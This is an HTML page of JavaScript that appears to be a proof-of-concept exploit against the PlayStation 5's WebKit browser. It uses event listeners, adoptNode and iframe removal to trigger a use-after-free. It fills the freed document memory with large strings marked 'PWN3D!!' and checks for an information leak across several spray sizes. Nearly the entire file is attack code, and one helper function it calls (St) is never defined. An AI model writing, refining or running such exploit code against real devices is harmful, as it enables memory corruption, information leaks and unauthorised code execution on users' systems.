<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 EventTarget — Third Listener (Low Memory)</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace}
#out{position:fixed;top:0;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
</style>
</head>
<body>
<div id="out"></div>
<button id="btn" style="position:fixed;top:10px;right:10px;z-index:999;
padding:10px 20px;background:#333;color:#0f0;border:1px solid #0f0;
cursor:pointer;font-family:monospace">▶ TRIGGER</button>
<script>
"use strict";

var O = document.getElementById("out");
var btn = document.getElementById("btn");

function P(m, c) {
    var s = document.createElement("span");
    if (c) s.className = c;
    s.textContent = m + "\n";
    O.appendChild(s);
    O.scrollTop = O.scrollHeight;
}
function Ok(m) { P("  ✅ " + m, "ok"); }
function Fl(m) { P("  ✘ " + m, "er"); }
function Hi(m) { P("  ► " + m, "hl"); }
function Dm(m) { P("  " + m, ""); }

// Build spray in chunks to avoid OOM
// Start with smaller size and increase
var SPRAY_SIZES = [4, 8, 12, 16, 24, 32, 48, 64]; // MB
var currentSizeIndex = 0;

function buildSpray(sizeMB) {
    var targetBytes = sizeMB * 1024 * 1024;
    var chunkSize = 1024 * 1024; // 1MB chunks
    var chunks = [];
    var built = 0;
    
    // First chunk: marker bytes
    var firstChunk = 'PWN3D!!\x00\x01\x00\x00\x00\x00\x00\x00';
    while (firstChunk.length < chunkSize) {
        firstChunk += 'A';
    }
    chunks.push(firstChunk);
    built += firstChunk.length;
    
    // Remaining chunks: all 'A's
    while (built < targetBytes) {
        var remaining = targetBytes - built;
        var thisChunk = Math.min(chunkSize, remaining);
        chunks.push('A'.repeat(thisChunk));
        built += thisChunk;
    }
    
    return chunks.join('');
}

var testCount = 0;
var maxTests = 3;

function runTest() {
    testCount++;
    if (testCount > maxTests) {
        P("\n✓ All tests complete.", "ok");
        btn.textContent = "✓ DONE";
        btn.disabled = false;
        return;
    }
    
    var spraySize = SPRAY_SIZES[currentSizeIndex];
    P("========================================", "hl");
    P("TEST #" + testCount + " — Spray: " + spraySize + "MB", "hl");
    P("========================================\n", "hl");
    
    try {
        Dm("Building " + spraySize + "MB spray string...");
        var spray = buildSpray(spraySize);
        Dm("Spray built: " + (spray.length / 1024 / 1024).toFixed(1) + "MB");
        
        var f = document.body.appendChild(document.createElement('iframe'));
        var a = document.createElement('div');
        var b = a.appendChild(document.createElement('div'));
        var thirdFired = false;
        var uafResult = null;
        
        // Listener 1: Frees Document
        a.addEventListener('a', eval('(function() {\
            document.adoptNode(a);\
            f.remove();\
            throw {\
                line: 1, column: 1,\
                sourceURL: spray\
            };\
        })'));
        
        // Listener 2: Buffer
        a.addEventListener('a', function() {
            Dm("  [2] Buffer listener");
        });
        
        // Listener 3: AFTER throw
        a.addEventListener('a', function() {
            thirdFired = true;
            Dm("  [3] FIRED after throw!");
            
            try {
                var doc = f.contentDocument;
                if (doc === null) {
                    Dm("  contentDocument is null");
                    uafResult = { status: "null" };
                } else {
                    Dm("  contentDocument is NOT null!");
                    Dm("  nodeType: " + doc.nodeType);
                    Dm("  URL: " + doc.URL);
                    Dm("  title: " + doc.title);
                    
                    var props = {
                        nodeType: doc.nodeType,
                        URL: doc.URL,
                        title: doc.title,
                        characterSet: doc.characterSet
                    };
                    
                    for (var k in props) {
                        var v = String(props[k]);
                        if (v.indexOf('PWN3D') !== -1) {
                            Fl("  ★ LEAK! " + k + " contains spray!");
                            Fl("  Starts: " + v.substring(0, 20));
                        }
                    }
                    
                    uafResult = { status: "reclaimed", props: props };
                }
            } catch (e) {
                Dm("  Exception: " + e.message);
                uafResult = { status: "error", error: e.message };
            }
        });
        
        // Bubble listener
        b.addEventListener('a', function() {
            f.contentDocument.adoptNode(a);
        });
        
        Dm("Dispatching event with " + spraySize + "MB spray...");
        b.dispatchEvent(new Event('a', { bubbles: true }));
        
        setTimeout(function() {
            P("", "");
            Hi("===== RESULTS =====");
            
            if (thirdFired) {
                Ok("Third listener FIRED!");
                if (uafResult) {
                    Dm("Status: " + uafResult.status);
                    if (uafResult.props) {
                        for (var k in uafResult.props) {
                            var v = String(uafResult.props[k]);
                            Dm("  " + k + " = " + v.substring(0, 50));
                        }
                    }
                    if (uafResult.error) Fl("Error: " + uafResult.error);
                    
                    if (uafResult.status === "reclaimed") {
                        Ok("Document memory was accessible after UAF!");
                        if (uafResult.props && uafResult.props.URL.indexOf('PWN3D') !== -1) {
                            St("★★★ INFO LEAK ACHIEVED! ★★★");
                        }
                    }
                }
            } else {
                Fl("Third listener did NOT fire");
                Dm("WebKit stops dispatch after throw");
            }
            
            // Cleanup
            try { document.body.removeChild(f); } catch(e) {}
            
            // Next spray size
            currentSizeIndex++;
            if (currentSizeIndex >= SPRAY_SIZES.length) {
                currentSizeIndex = 0;
            }
            
            // Force GC before next test
            Dm("\nGC pressure...");
            for (var i = 0; i < 5; i++) {
                var gc = [];
                for (var j = 0; j < 100; j++) gc.push(new ArrayBuffer(65536));
            }
            spray = null;
            
            setTimeout(runTest, 1500);
        }, 1000);
        
    } catch (e) {
        Fl("OOM or exception at " + SPRAY_SIZES[currentSizeIndex] + "MB: " + e.message);
        Dm("Trying next smaller size...");
        currentSizeIndex++;
        if (currentSizeIndex >= SPRAY_SIZES.length) {
            currentSizeIndex = 0;
        }
        setTimeout(runTest, 1000);
    }
}

btn.addEventListener('click', function() {
    btn.textContent = "▶ RUNNING...";
    btn.disabled = true;
    P("\n\n", "");
    P("♠ PS5 EventTarget UAF — Third Listener ♠", "hl");
    P("========================================", "hl");
    P("Tests " + SPRAY_SIZES.join(', ') + "MB sprays", "");
    Dm("If third listener fires → WebKit continues dispatch");
    Dm("If properties contain 'PWN3D' → Info Leak!");
    P("", "");
    testCount = 0;
    currentSizeIndex = 0;
    runTest();
});

P("Page loaded. Click button to start.", "");
P("Starts with small spray (4MB) to avoid OOM.", "");
P("If OOM occurs, it skips to next size.", "");
</script>
</body>
</html>
